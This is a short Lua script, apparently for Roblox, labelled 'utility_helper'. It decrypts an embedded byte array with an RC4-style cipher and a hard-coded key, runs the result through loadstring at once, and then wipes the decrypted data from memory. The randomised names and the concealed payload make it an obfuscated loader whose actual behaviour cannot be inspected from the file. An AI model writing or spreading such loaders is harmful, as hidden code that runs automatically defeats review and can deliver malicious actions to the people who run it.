-- Protected Segment (utility_helper)
local UQknfUfR = 207
local keWsuNUq = {
{61,122,34,216,64,169,243,47,60,229,203,180,95,135,157,37,177,110,98,79,19,17,50,26,183,111,232,136,88,205,58,107,220,125,132,63,57,207,115,27,60,120,64,80,70,232,54,64,96,124,196,210,232,233,10,96,97,170,87,186},{37,94,92,147,59,209,104,191,233,124,22,57,183,225,174,135,120,149,210,254,56,82,9,92,68,217,203,82,149,8,236,59,140,135,83,132,252,87,155,96,214,151,80,238,81,169,9,236,189,21,145,250,179,81,51,3,231,59,184,209},{22,125,61,250,53,127,188,156,160,204,197,105,157,147,186,83,235,197,159,122,75,139,115,244,254,186}
}
local oZeCSBst = "gvJILQbSnsuSEGsf"

local function QPbjBZnd(sfFvZXDe_data, sfFvZXDe_key)
    if type(sfFvZXDe_key) ~= "string" or #sfFvZXDe_key == 0 then return "" end
    local sfFvZXDe = {}
    for EDpoCamn = 0, 255 do sfFvZXDe[EDpoCamn] = EDpoCamn end
    local yijpPrRg = 0
    for EDpoCamn = 0, 255 do
        local srcdKeuT = sfFvZXDe_key:byte((EDpoCamn % #sfFvZXDe_key) + 1)
        yijpPrRg = (yijpPrRg + sfFvZXDe[EDpoCamn] + srcdKeuT) % 256
        sfFvZXDe[EDpoCamn], sfFvZXDe[yijpPrRg] = sfFvZXDe[yijpPrRg], sfFvZXDe[EDpoCamn]
    end
    local EDpoCamn = 0
    local yijpPrRg = 0
    local WhuTTYuT = {}
    for _, mPsxFfSr in ipairs(sfFvZXDe_data) do
        EDpoCamn = (EDpoCamn + 1) % 256
        yijpPrRg = (yijpPrRg + sfFvZXDe[EDpoCamn]) % 256
        sfFvZXDe[EDpoCamn], sfFvZXDe[yijpPrRg] = sfFvZXDe[yijpPrRg], sfFvZXDe[EDpoCamn]
        local srcdKeuT = sfFvZXDe[(sfFvZXDe[EDpoCamn] + sfFvZXDe[yijpPrRg]) % 256]
        local unmasked = bit32.bxor(mPsxFfSr, UQknfUfR)
        table.insert(WhuTTYuT, string.char(bit32.bxor(unmasked, srcdKeuT)))
    end
    return table.concat(WhuTTYuT)
end

local sfFvZXDe_flat = {}
for _, chunk in ipairs(keWsuNUq) do
    for _, byte in ipairs(chunk) do
        table.insert(sfFvZXDe_flat, byte)
    end
end

local decrypted = QPbjBZnd(sfFvZXDe_flat, oZeCSBst)
local HeALFnHE, GQzndnYK = loadstring(decrypted)

-- Immediate Memory Sanitation: Overwrite decrypted variables
table.clear(sfFvZXDe_flat)
sfFvZXDe_flat = nil

if HeALFnHE then 
    local result = HeALFnHE() 
    decrypted = nil
    HeALFnHE = nil
    return result
else 
    decrypted = nil
    warn("[ecco] Boot Error (" .. "utility_helper" .. "): " .. tostring(GQzndnYK)) 
end
